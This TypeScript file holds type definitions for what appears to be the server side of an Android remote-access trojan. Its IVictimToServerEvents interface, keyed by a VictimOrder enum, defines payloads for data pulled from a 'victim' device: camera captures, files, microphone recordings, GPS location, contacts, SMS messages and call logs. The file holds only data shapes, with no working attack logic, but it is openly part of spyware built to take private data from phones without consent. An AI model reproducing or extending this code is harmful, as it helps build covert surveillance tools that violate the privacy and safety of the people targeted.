import { type VictimOrder } from '../enums/VictimOrder';

export interface CameraItem {
    name: string;
    id: number;
}

export type CameraOrderPayload =
    | { image: undefined; buffer: undefined; camList: true; list: CameraItem[] }
    | {
          camList: undefined;
          image: true;
          buffer: ArrayBuffer;
      };

export type FileManagerPayload =
    | Array<{
          name: string;
          isDir: boolean;
          path: string;
      }>
    | FilePayload;

export interface FilePayload {
    file: true;
    name: string;
    buffer: ArrayBuffer;
}

export interface LocationPayload {
    enable: boolean;
    lat: number;
    lng: number;
}

export interface ContactsPayload {
    contactsList: Array<{
        phoneNo: string;
        name: string;
    }>;
}

export type SMSPayload =
    | boolean
    | {
          smsList: Array<{
              phoneNo: string;
              msg: string;
          }>;
      };

export interface CallLogPayload {
    callsList: Array<{
        phoneNo: string;
        name: string;
        duration: string;
        type: number;
    }>;
}

type OrderCallback<T> = (data: T) => void;

export interface IVictimToServerEvents {
    [VictimOrder.CAMERA]: OrderCallback<CameraOrderPayload>;
    [VictimOrder.FILE_MANAGER]: OrderCallback<FileManagerPayload>;
    [VictimOrder.MICROPHONE]: OrderCallback<FilePayload>;
    [VictimOrder.LOCATION]: OrderCallback<LocationPayload>;
    [VictimOrder.CONTACTS]: OrderCallback<ContactsPayload>;
    [VictimOrder.SMS]: OrderCallback<SMSPayload>;
    [VictimOrder.CALLS]: OrderCallback<CallLogPayload>;
}
